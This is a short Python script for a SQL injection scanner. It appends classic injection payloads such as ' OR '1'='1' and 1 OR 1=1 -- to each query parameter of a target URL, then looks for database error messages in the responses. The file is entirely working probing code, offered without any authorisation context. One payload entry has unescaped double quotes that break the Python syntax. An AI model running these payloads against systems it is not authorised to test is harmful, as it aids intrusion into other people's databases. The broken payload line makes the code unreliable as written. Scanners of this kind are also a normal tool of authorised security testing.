import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = ["'", "' OR '1'='1", "" OR "1"="1", "1 OR 1=1 -- "]

class SQLIScanner:
    def __init__(self, url: str, timeout: float = 8.0):
        self.url = url
        self.timeout = timeout

    def _inject(self, url: str, payload: str):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if not qs:
            return None
        new_qs = {k: f"{v[0]}{payload}" for k, v in qs.items()}
        new_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
        try:
            r = requests.get(new_url, timeout=self.timeout)
            if any(err in r.text.lower() for err in ["sql syntax", "mysql", "sqlite", "postgresql", "odbc", "sqlstate"]):
                return {"url": new_url, "payload": payload, "db_error": True}
        except Exception:
            pass
        return None

    def run(self):
        findings = []
        for pl in PAYLOADS:
            res = self._inject(self.url, pl)
            if res:
                findings.append(res)
        return findings
